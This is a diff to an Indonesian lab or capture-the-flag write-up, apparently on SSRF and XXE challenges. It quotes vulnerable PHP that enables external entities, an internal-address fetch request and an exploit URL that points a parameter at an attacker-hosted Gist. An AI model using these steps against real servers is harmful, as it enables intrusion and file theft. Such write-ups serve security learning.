@@ -197,7 +197,7 @@ Jika kita lihat pada laman browser, terdapat input yang bisa kta masukkan kode b
   <li>
     <p>
       <strong>Analisis Source Code:</strong>
-Ditemukan celah pada logika Python: <code>url.split("google.com/url?q=")[1]</code>. Kode hanya mengambil bagian belakang string tanpa memvalidasi bagian depan.
+Ditemukan celah pada logika Python: Pada App.tsx, terdapat <code>url.split("google.com/url?q=")[1]</code>. Kode hanya mengambil bagian belakang string tanpa memvalidasi bagian depan.
     </p>
   </li>
 
@@ -263,6 +263,7 @@ Mengirimkan request <code>/fetch?url=http%3A%2F%2F10.15.42.23%3A5005%2F</code> d
 <!-- ----------- 3a. Nama Kerentanan ----------- -->
 <h3>Nama Kerentanan</h3>
 
+
 <p>
   <strong>
     XML External Entity (XXE) Injection
@@ -302,11 +303,41 @@ Mengirimkan request <code>/fetch?url=http%3A%2F%2F10.15.42.23%3A5005%2F</code> d
 <ol>
   <li>
     <p>
-      <strong>Identifikasi Celah:</strong>
-Halaman depan menyebutkan "supports DTD processing and external entity resolution". Ini adalah indikator utama XXE.
+      <strong>Tampilan Website</strong>: Menggunakan tampilan website biasa dengan clue 'XML' di sana.
+      <img width="1468" height="870" alt="Screenshot 2025-12-06 at 06 47 58" src="https://github.com/user-attachments/assets/9a962989-9441-4db1-8f6a-e10a55975096" />
     </p>
   </li>
   
+  <li>
+    <p>
+      <strong>Identifikasi Celah:</strong>
+ Dari tampilan website tersebut, berarti ada kemungkinan bahwa website ini adalah kasus XXE (XML External Entity). Selain itu, dari file index.php yang diberikan, terdapat celah kerentanan. Untuk kodenya seperti ini.
+    </p>
+    Pengaktifan Fitur Berbahaya
+    <pre>
+$doc->substituteEntities = true; // Enable entity substitution
+if (!$doc->loadXML($xml_data, LIBXML_NOENT | LIBXML_DTDLOAD)) { ... }
+    </pre>
+    Pengambilan Data dari URL
+    <pre>
+    $xml_data = @file_get_contents($xml_idol);
+    </pre>
+    Output Data
+    <pre>
+$dataElement = $doc->getElementsByTagName('data')->item(0);
+$data = $dataElement ? $dataElement->nodeValue : ...
+    </pre>
+  </li>
+    
+  <li>
+    <p>
+      <strong>Strategi Eksploitasi</strong>: Tantangannya adalah pada filter anti-HTML, di mana saya tidak bisa menghosting file XML dengan tag HTML.
+      <pre>
+      else if (strpos($xml_data, '<!DOCTYPE html>') !== false || strpos($xml_data, '<html') !== false)
+      </pre>
+    </p>
+  </li>
+        
   <li>
     <p>
       <strong>
@@ -318,11 +349,12 @@ Karena ada filter HTML, saya membuat file XML murni (Raw) di GitHub Gist yang be
     <blockquote>
       <p>
         <em>
-          [MASUKKAN SCREENSHOT GIST RAW]
+          <img width="921" height="185" alt="Screenshot 2025-12-06 at 12 22 45" src="https://github.com/user-attachments/assets/9bf5e90a-713f-4f66-9f0d-16992272b2ef" />
         </em>
       </p>
     </blockquote>
-    
+   
+
   </li>
   
   <li>
@@ -331,11 +363,14 @@ Karena ada filter HTML, saya membuat file XML murni (Raw) di GitHub Gist yang be
         Eksploitasi:
       </strong>
 Memasukkan URL Raw Gist tersebut ke parameter <code>?idol=</code>.
+      <pre>
+        http://10.15.42.23:2509/?idol=https://gist.githubusercontent.com/jofanka10/fb6d7f358104d8d12893b39a34f9c7b3/raw/7947c9d92975849c9e17fb6b795c296ab7ad5323/gistfile1.txt
+      </pre>
     </p>
     <blockquote>
       <p>
         <em>
-          [MASUKKAN SCREENSHOT URL BAR BROWSER]
+           <img width="1468" height="768" alt="Screenshot 2025-12-06 at 12 29 14" src="https://github.com/user-attachments/assets/34e29c34-35fb-43e7-9817-6ddc75878fce" />
         </em>
       </p>
     </blockquote>
